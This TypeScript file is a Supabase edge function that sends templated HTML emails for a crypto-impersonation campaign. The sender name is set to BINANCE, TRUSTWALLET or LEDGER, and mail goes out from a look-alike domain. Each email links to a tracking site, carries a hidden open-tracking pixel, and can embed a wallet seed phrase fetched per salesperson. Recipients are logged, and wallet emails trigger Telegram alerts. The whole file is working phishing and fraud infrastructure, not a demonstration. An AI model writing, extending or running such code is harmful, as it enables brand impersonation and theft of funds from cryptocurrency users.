import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.50.2";

// Initialize Resend with dynamic API key support
const resendClients: Record<string, any> = {};

async function getResend(apiKey: string) {
  if (!apiKey) return null;
  if (!resendClients[apiKey]) {
    try {
      const { Resend } = await import("https://esm.sh/resend@2.0.0");
      resendClients[apiKey] = new Resend(apiKey);
    } catch (error) {
      console.error("Failed to initialize Resend:", error);
      return null;
    }
  }
  return resendClients[apiKey];
}

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface EmailRequest {
  to: string;
  name?: string;
  first_name?: string;
  subject?: string;
  content?: string;
  template_id?: string;
  commercial_id?: string;
  contact_id?: string;
  domain?: string;
  variables?: Record<string, string>;
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const requestBody: EmailRequest = await req.json();
    const { to, name, first_name, subject, content, template_id, commercial_id, contact_id, domain, variables } = requestBody;

    console.log('📧 Email request received:', { to, template_id, commercial_id, domain });

    // Initialize Supabase
    const supabase = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? ""
    );

    // Validate required fields
    if (!to?.includes('@') || !commercial_id) {
      return new Response(
        JSON.stringify({ success: false, error: 'Invalid email or missing commercial ID' }),
        { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
      );
    }

    // Fetch commercial data for email configuration
    const { data: commercial, error: commercialError } = await supabase
      .from('commercials')
      .select('id, name, email_domain_preference, email_alias_from, auto_include_wallet')
      .eq('id', commercial_id)
      .single();

    if (commercialError || !commercial) {
      console.error('Commercial not found:', commercialError);
      return new Response(
        JSON.stringify({ success: false, error: 'Commercial not found' }),
        { status: 404, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
      );
    }

    // Fetch template if template_id is provided
    let emailSubject = subject;
    let emailContent = content;
    let templateUsed = null;

    if (template_id) {
      const { data: template, error: templateError } = await supabase
        .from('email_templates')
        .select('*')
        .eq('id', template_id)
        .single();

      if (template && !templateError) {
        emailSubject = template.subject;
        emailContent = template.content;
        templateUsed = template;
        console.log(`📄 Using template: ${template.name}`);
      }
    }

    // Get server configuration
    const { data: serverConfig } = await supabase
      .from('server_config')
      .select('current_server_ip')
      .single();

    const currentServerIp = serverConfig?.current_server_ip ? String(serverConfig.current_server_ip) : '127.0.0.1';

    // Generate unique tracking ID
    const trackingId = contact_id || `${commercial_id}_${Date.now()}_${Math.random().toString(36).substring(7)}`;

    // Calculate current time minus 10 minutes
    const now = new Date();
    const timeMinus10 = new Date(now.getTime() - 10 * 60 * 1000);
    const formattedTime = timeMinus10.toISOString().replace('T', ' ').replace(/\.\d{3}Z$/, ' UTC');

    // Create tracking and home links
    const trackingLink = `https://fr.bnbsafeguard.com/?t=${trackingId}&c=${commercial_id}`;
    const homeLink = `https://fr.bnbsafeguard.com/?c=${commercial_id}&l=${contact_id || trackingId}`;
    
    // Variable replacement engine
    const replaceVariables = (text: string): string => {
      if (!text) return '';
      
      const defaultVariables = {
        name: name || first_name || to.split('@')[0],
        first_name: first_name || name || to.split('@')[0],
        email: to,
        commercial_name: commercial.name,
        current_ip: currentServerIp,
        current_time_minus_10: formattedTime,
        link: trackingLink,
        home_link: homeLink,
        ...variables // Custom variables override defaults
      };

      let result = text;
      for (const [key, value] of Object.entries(defaultVariables)) {
        const regex = new RegExp(`{{\\s*${key}\\s*}}`, 'gi');
        result = result.replace(regex, String(value));
      }
      
      return result;
    };

    // Replace variables in subject and content
    emailSubject = replaceVariables(emailSubject || 'Important Information');
    emailContent = replaceVariables(emailContent || '<p>Hello {{name}},</p><p>Thank you for your interest.</p>');

    // Add wallet if content contains wallet placeholder and commercial has auto_include_wallet enabled
    if (/\{\{\s*wallet\s*\}\}/i.test(emailContent)) {
      console.log(`📧 Email template contains wallet variable for commercial ${commercial.name}`);
      
      // Check if commercial has auto_include_wallet enabled
      if (commercial.auto_include_wallet) {
        console.log(`💼 Auto-include wallet is enabled for commercial ${commercial.name}`);
        try {
          const { data: walletData, error: walletError } = await supabase.functions.invoke('get-wallet', {
            body: { commercial_id, client_tracking_id: to }
          });
          
          if (walletError) {
            console.error('❌ Wallet fetch error:', walletError);
            throw walletError;
          }
          
          console.log('🔍 Wallet data received:', { success: walletData?.success, hasWallet: !!walletData?.wallet });
          
          const walletPhrase = walletData?.wallet || walletData?.phrase || '';
          if (walletPhrase && walletData?.success) {
            emailContent = emailContent.replace(/\{\{\s*wallet\s*\}\}/gi, walletPhrase);
            console.log('💼 Wallet phrase added to email successfully');
          } else {
            console.warn('⚠️ No wallet phrase found in response:', walletData);
            // Replace with placeholder text if wallet not available
            emailContent = emailContent.replace(/\{\{\s*wallet\s*\}\}/gi, '[Wallet sera fourni séparément]');
          }
        } catch (error) {
          console.error('❌ Failed to fetch wallet:', error);
          // Replace with placeholder text if wallet fetch fails
          emailContent = emailContent.replace(/\{\{\s*wallet\s*\}\}/gi, '[Wallet sera fourni séparément]');
        }
      } else {
        console.log(`⚠️ Auto-include wallet is disabled for commercial ${commercial.name} - using placeholder`);
        // Replace with placeholder text if auto_include_wallet is disabled
        emailContent = emailContent.replace(/\{\{\s*wallet\s*\}\}/gi, '[Contactez votre commercial pour obtenir votre wallet]');
      }
    }

    // Determine sender name based on template type
    let senderName = 'BINANCE'; // default
    if (templateUsed && templateUsed.name && templateUsed.name.toUpperCase().includes('TRUST')) {
      senderName = 'TRUSTWALLET';
      console.log('📧 Using TRUSTWALLET sender for Trust Wallet template');
    } else if (emailSubject && emailSubject.includes('[LEDGER]')) {
      senderName = 'LEDGER';
      console.log('📧 Using LEDGER sender for Ledger template');
    } else if (emailSubject && emailSubject.toLowerCase().includes('trustwallet')) {
      senderName = 'TRUSTWALLET';
      console.log('📧 Using TRUSTWALLET sender for TrustWallet subject');
    }

    // Determine email domain and API key
    const domainPreference = domain || commercial.email_domain_preference || 'domain1';
    let resendApiKey = '';
    let fromAddress = '';

    if (domainPreference === 'domain2') {
      fromAddress = `${senderName} <do_no_reply@mailersrp-2binance.com>`;
      resendApiKey = Deno.env.get('RESEND_API_KEY_DOMAIN2') || '';
    } else {
      fromAddress = `${senderName} <do_no_reply@mailersrp-2binance.com>`;
      resendApiKey = Deno.env.get('RESEND_API_KEY') || '';
    }

    if (!resendApiKey) {
      console.error('❌ Missing Resend API key for domain:', domainPreference);
      return new Response(
        JSON.stringify({ success: false, error: 'Email service not configured' }),
        { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
      );
    }

    // Add open tracking pixel to email content
    const openTrackingUrl = `https://lnokphjzmvdegutjpxhw.supabase.co/functions/v1/track-email-open?id=${trackingId}`;
    const trackingPixel = `<img src="${openTrackingUrl}" width="1" height="1" style="display:none;" />`;
    
    // Insert tracking pixel before closing body tag or at the end
    if (emailContent.includes('</body>')) {
      emailContent = emailContent.replace('</body>', `${trackingPixel}</body>`);
    } else {
      emailContent += trackingPixel;
    }

    // Log email to database first
    const { data: emailLog, error: logError } = await supabase
      .from('email_logs')
      .insert([{
        tracking_id: trackingId,
        tracking_code: trackingId, // For backward compatibility
        recipient_email: to,
        recipient_name: name || first_name,
        commercial_id,
        contact_id,
        template_id,
        subject: emailSubject,
        content: emailContent,
        status: 'pending',
        sent_at: new Date().toISOString()
      }])
      .select()
      .single();

    if (logError) {
      console.error('❌ Failed to log email:', logError);
      return new Response(
        JSON.stringify({ success: false, error: 'Failed to log email' }),
        { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
      );
    }

    // Send email with Resend
    const resend = await getResend(resendApiKey);
    if (!resend) {
      await supabase
        .from('email_logs')
        .update({ status: 'failed' })
        .eq('id', emailLog.id);

      return new Response(
        JSON.stringify({ success: false, error: 'Email service initialization failed' }),
        { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
      );
    }

    try {
      const emailResult = await resend.emails.send({
        from: fromAddress,
        to: [to],
        subject: emailSubject,
        html: emailContent,
        headers: {
          'List-Unsubscribe': '<mailto:unsubscribe@example.com>',
        }
      });

      console.log('✅ Email sent successfully:', emailResult.data?.id);

      // Update log with success
      await supabase
        .from('email_logs')
        .update({ 
          status: 'sent',
          resend_id: emailResult.data?.id 
        })
        .eq('id', emailLog.id);

      // Send Telegram notification for important emails
      if (templateUsed?.name?.toLowerCase().includes('wallet') || emailContent.includes('wallet')) {
        await supabase.functions.invoke('send-telegram-notification', {
          body: {
            message: `📧 Important Email Sent\n🎯 To: ${to}\n👤 Commercial: ${commercial.name}\n📋 Template: ${templateUsed?.name || 'Custom'}\n📊 Tracking: ${trackingId}`
          }
        });
      }

      return new Response(
        JSON.stringify({
          success: true,
          message: 'Email sent successfully',
          data: {
            email_id: emailResult.data?.id,
            tracking_id: trackingId,
            tracking_url: openTrackingUrl,
            home_link: homeLink
          }
        }),
        { status: 200, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
      );

    } catch (sendError: any) {
      console.error('❌ Resend API error:', sendError);
      
      // Update log with error
      await supabase
        .from('email_logs')
        .update({ status: 'failed' })
        .eq('id', emailLog.id);

      return new Response(
        JSON.stringify({ 
          success: false, 
          error: `Email sending failed: ${sendError.message}` 
        }),
        { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
      );
    }

  } catch (error: any) {
    console.error('❌ Function error:', error);
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: 'Internal server error',
        details: error.message 
      }),
      { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
    );
  }
});